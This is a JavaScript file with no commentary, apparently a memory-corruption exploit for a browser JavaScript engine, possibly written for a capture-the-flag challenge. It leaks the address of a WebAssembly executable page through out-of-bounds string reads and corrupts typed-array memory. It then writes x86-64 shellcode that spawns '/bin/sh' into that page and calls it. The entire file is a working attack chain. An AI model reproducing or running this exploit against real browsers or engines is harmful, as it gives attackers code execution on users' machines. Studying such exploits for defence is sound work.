let array_buf = new ArrayBuffer(8);
let buf_view = new DataView(array_buf);

function f2i(f) {
  buf_view.setFloat64(0, f);
  return [buf_view.getUint32(0), buf_view.getUint32(4)];
}

function i2f(a, b) {
  buf_view.setUint32(0, a);
  buf_view.setUint32(4, b);
  
  return buf_view.getFloat64(0);
}

function gc() {
  for (let i = 0; i < 0x10; i++) { new ArrayBuffer(0x1000000); }
}


function hex(a, b) {
  a = '00000000'+a.toString(16);
  b = '00000000'+b.toString(16);
  a = a.substring(a.length-8,a.length);
  b = b.substring(b.length-8,b.length);
  return '0x'+a+b;
}

gc();

const wasm_code = new Uint8Array([
  0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
  0x01, 0x85, 0x80, 0x80, 0x80, 0x00, 0x01, 0x60,
  0x00, 0x01, 0x7f, 0x03, 0x82, 0x80, 0x80, 0x80,
  0x00, 0x01, 0x00, 0x06, 0x81, 0x80, 0x80, 0x80,
  0x00, 0x00, 0x07, 0x85, 0x80, 0x80, 0x80, 0x00,
  0x01, 0x01, 0x61, 0x00, 0x00, 0x0a, 0x8a, 0x80,
  0x80, 0x80, 0x00, 0x01, 0x84, 0x80, 0x80, 0x80,
  0x00, 0x00, 0x41, 0x00, 0x0b
]);
var a = new String('helloworld');
const wasm_instance = new WebAssembly.Instance(new WebAssembly.Module(wasm_code));

const wasm_func = wasm_instance.exports.a;

var d = new Uint8Array([0]);
var buffer = new Uint8Array([0]);


var m1 = 0, m2 = 0, offset=0;
for (let j = -256; j < 256; j+=4) {
  m1 = 0, m2 = 0;
  for (let i = 0; i < 4; i++) {
    m1 += a.charCodeAt(3340+j+i) << (8*i);
  }
  for (let i = 0; i < 4; i++) {
    m2 += a.charCodeAt(3340+j+4+i) << (8*i);
  }
  if (m2 !== 0 && m1 !== 0 && (m1&0xfff) === 0 && (m1&0x1000) === 0x1000) {
    offset = 3896+j;
    console.log('found: '+offset);
    break;
  }
}


let rwx_addr = [m2,m1];
console.log('rwx_addr: '+hex(...rwx_addr));

let other = (BigInt(rwx_addr[0])<<32n)+BigInt(rwx_addr[1])-0x80804edn;
other = [Number(other >> 32n), Number(other & 0xffffffffn)];


[m1, m2] = other;
for (let i = 0; i < 4; i++) {
  d.fill(m1&0xff, 164+0x28+4+i, 164+0x28+4+i+1);
  m1 >>= 8;
}
for (let i = 0; i < 4; i++) {
  d.fill(m2&0xff, 164+0x28+i, 164+0x28+i+1);
  m2 >>= 8;
}

var shellcode = [106, 104, 72, 184, 47, 98, 105, 110, 47, 47, 47, 115, 80, 72, 137, 231, 104, 114, 105, 1, 1, 129, 52, 36, 1, 1, 1, 1, 49, 246, 86, 106, 8, 94, 72, 1, 230, 86, 72, 137, 230, 49, 210, 106, 59, 88, 15, 5, 144, 144, 144, 144];
for (let i = 0; i < shellcode.length; i++) {
  buffer.fill(shellcode[i], i, i+1);
}

wasm_func();
